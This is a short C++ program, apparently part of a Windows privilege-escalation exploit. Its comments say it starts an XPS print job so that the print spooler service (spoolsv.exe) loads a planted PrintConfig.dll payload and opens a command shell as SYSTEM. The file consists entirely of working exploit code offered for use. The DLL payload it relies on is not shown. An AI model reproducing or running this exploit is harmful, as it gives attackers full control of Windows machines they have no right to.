#include <windows.h>
#include <xpsprint.h>      
#include <stdio.h>
#pragma comment(lib, "xpsprint.lib")
#pragma warning(disable : 4995)

/*
* Project's purpose:
* Trigger the load of PrintConfig.dll (our payload) in spoolsv.exe to spawn cmd as SYSTEM
*/
int main()
{
	HANDLE hComplete = CreateEventW(nullptr, TRUE, FALSE, nullptr);
	if (!hComplete) {
		printf("CreateEvent failed 0x%lx\n", GetLastError());
		return 1;
	}

	IXpsPrintJob* job = nullptr;
	IXpsPrintJobStream* docStream = nullptr;

	// Start an XPS print job so spoolsv.exe will load PrintConfig.dll
	puts("[*] Starting an XPS Job to pop a shell...\n");
	HRESULT hr = StartXpsPrintJob(
		L"Microsoft XPS Document Writer",
		L"job",
		nullptr,
		nullptr,
		hComplete,
		nullptr, 0,
		&job, &docStream,
		nullptr
	);

	if (docStream) {
		docStream->Close();
		docStream->Release();
	}
	if (job)
		job->Release();
	CloseHandle(hComplete);

	return 0;
}